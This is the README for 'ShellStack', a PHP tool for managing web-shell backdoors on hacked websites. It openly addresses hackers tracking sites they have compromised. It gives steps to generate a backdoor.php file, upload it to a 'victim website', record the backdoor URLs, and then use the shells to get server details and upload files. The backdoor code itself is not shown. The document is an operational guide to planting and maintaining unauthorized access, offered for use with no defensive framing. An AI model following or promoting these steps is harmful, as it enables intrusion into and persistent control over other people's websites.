# ShellStack 
#### Version 1.0
----
ShellStack is a PHP based backdoor management tool. This Tool comes handy for "HACKERS" who wish to keep a track of every website they hack. The tool generates a backdoor file which you just have to upload to the site and put the backdoor URL in the shells.txt present in the tool's directory.

# With ShellStack You can
- Import PHP Shells
- Get Server Details
- Upload Files From Your System using your terminal
- And Above all You Can Manage Your Backdoors Efficiently

# How To Use
1. `git clone https://github.com/trhacknon/shellstack`
2. `cd shellstack`
3. `php shellstack.php`
4. `generatebd` and exit the tool use <kbd>CTRL</kbd> + <kbd>C</kbd> - This will generate a backdoor file in the same directory as of the tool in a file named **backdoor.php**
5. Upload The Backdoor File To The Victim website
6. Copy The Backdoor URL and paste it in the **shells.txt** file present in the tool's directory and save it (*Each backdoor is separated by a new line*)
7. `php shellstack.php`
8. Enter The **Serial No** Assigned To The Backdoor
9. Rest is pretty Self explanatory
